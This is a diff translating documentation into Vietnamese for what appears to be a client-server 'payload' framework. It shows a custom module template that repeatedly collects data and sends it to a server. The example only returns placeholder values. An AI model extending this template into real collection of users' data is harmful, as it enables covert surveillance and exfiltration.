     
-    # Main client loop
+    # Vòng lặp chính của máy khách
     client.run()
 else:
-    print("❌ Failed to connect to server")
+    print("❌ Không thể kết nối tới máy chủ")
 ```
 
-### 🔧 Custom Payload Module
+### 🔧 Module Payload Tùy Chỉnh
 
 ```python
 from payload.modules.base import BasePayload
@@ -878,7 +873,7 @@ class CustomDataCollector(BasePayload):
         self.collection_thread = None
         
     def start(self) -> bool:
-        """Start data collection."""
+        """Bắt đầu thu thập dữ liệu."""
         if self.running:
             return False
             
@@ -888,30 +883,30 @@ class CustomDataCollector(BasePayload):
         return True
         
     def stop(self) -> bool:
-        """Stop data collection."""
+        """Dừng thu thập dữ liệu."""
         self.running = False
         if self.collection_thread:
             self.collection_thread.join(timeout=5)
         return True
         
     def _collection_loop(self):
-        """Main collection loop."""
+        """Vòng lặp thu thập chính."""
         while self.running:
             try:
                 data = self._collect_custom_data()
                 self.client.send_data('custom_data', data)
                 time.sleep(self.collection_interval)
             except Exception as e:
-                self.client.log_error(f"Collection error: {e}")
+                self.client.log_error(f"Lỗi thu thập: {e}")
                 
     def _collect_custom_data(self) -> dict:
-        """Collect custom data - implement your logic here."""
+        """Thu thập dữ liệu tùy chỉnh - triển khai logic của bạn ở đây."""
         return {
             'timestamp': time.time(),
             'custom_field': 'custom_value'
         }
 
-# Usage
+# Sử dụng
 custom_collector = CustomDataCollector(client)
 custom_collector.configure({'collection_interval': 30})
 custom_collector.start()
